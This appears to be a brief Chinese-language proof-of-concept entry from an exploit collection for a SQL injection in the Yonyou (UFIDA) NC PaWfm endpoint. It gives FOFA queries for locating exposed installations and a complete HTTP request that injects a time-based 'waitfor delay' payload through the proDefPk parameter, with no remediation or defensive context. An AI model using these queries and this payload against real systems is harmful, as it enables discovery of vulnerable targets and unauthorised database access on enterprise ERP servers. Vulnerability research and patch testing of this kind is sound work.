## 用友NC接口PaWfm存在sql注入漏洞

## fofa
```
icon_hash="1085941792"  
app="用友-UFIDA-NC"
```

## poc
```
GET /portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```

![image](https://github.com/wy876/POC/assets/139549762/59a73db4-f658-4a0c-b1ec-3f5dd6bf5f6a)
